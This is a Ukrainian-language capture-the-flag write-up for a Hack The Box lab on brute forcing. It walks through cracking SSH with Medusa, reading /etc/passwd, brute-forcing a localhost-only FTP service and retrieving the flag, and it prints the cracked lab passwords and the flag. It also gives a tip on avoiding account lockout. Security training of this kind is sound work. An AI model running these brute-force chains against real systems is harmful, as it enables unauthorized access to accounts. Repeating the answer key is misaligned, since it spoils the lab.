# SSH + FTP Brute Force Chain (Medusa)

## Модуль
[Login Brute Forcing — Service Brute Forcing](https://academy.hackthebox.com/app/module/57/section/491)

## Концепція

**Chained Service Brute Force** — спочатку брутфорс SSH для отримання
початкового доступу, потім зсередини машини брутфорс FTP на localhost
(порт не відкритий назовні). Флаг лежить на FTP сервері.

## Повний плейбук

### Крок 1 — Завантажити wordlist

```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

### Крок 2 — Medusa: брутфорс SSH

```bash
medusa -h TARGET_IP -n TARGET_PORT -u sshuser \
  -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
ACCOUNT FOUND: [ssh] Host: TARGET User: sshuser Password: 1q2w3e4r5t

### Крок 3 — SSH логін

```bash
ssh sshuser@TARGET_IP -p TARGET_PORT
# password: 1q2w3e4r5t
```

### Крок 4 — Розвідка зсередини

```bash
# Знайти ftpuser
cat /etc/passwd | grep ftp
# → ftpuser:x:1001:1001::/home/ftpuser:/bin/sh

# Знайти wordlist у home директорії
ls -la ~/
# → 2020-200_most_used_passwords.txt

# Перевірити чи FTP доступний зовні
medusa -h TARGET_IP -u ftpuser -P wordlist.txt -M ftp -t 3
# → Cannot connect — порт 21 закритий назовні

# FTP слухає тільки на localhost
cat /etc/vsftpd.conf | grep -i port
```

### Крок 5 — Medusa: брутфорс FTP на localhost (з SSH сесії)

```bash
# Запускати ВСЕРЕДИНІ SSH сесії
medusa -h 127.0.0.1 -u ftpuser \
  -P 2020-200_most_used_passwords.txt -M ftp -t 3
```
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122

### Крок 6 — FTP логін + завантаження flag.txt

```bash
ftp -n 127.0.0.1 <<EOF
user ftpuser qqww1122
get flag.txt /tmp/flag.txt
bye
EOF

cat /tmp/flag.txt
```

**Flag:** `HTB{SSH_and_FTP_Bruteforce_Success}`

---

## Medusa синтаксис

```bash
medusa [-h host|-H file] [-u user|-U file] [-p pass|-P file] -M module [options]
```

| Параметр | Опис |
|----------|------|
| `-h` | Target IP |
| `-n` | Нестандартний порт |
| `-u` / `-U` | Один юзер / файл з юзерами |
| `-p` / `-P` | Один пароль / файл з паролями |
| `-M` | Модуль: `ssh`, `ftp`, `rdp`, `http` |
| `-t` | Кількість паралельних потоків |
| `-f` | Зупинитись після першого SUCCESS |

## Ключові моменти

| # | Що важливо |
|---|-----------|
| 1 | FTP може бути закритий назовні — перевіряти через `localhost` з SSH сесії |
| 2 | Wordlist може лежати на самій машині — `ls ~/` після логіну |
| 3 | `ftp -n` + heredoc — зручний спосіб FTP без інтерактивного режиму |
| 4 | Флаг може бути недоступний для sshuser — потрібен саме FTP логін |
| 5 | Medusa `-t 3` для SSH — низький thread count щоб не тригерити lockout |
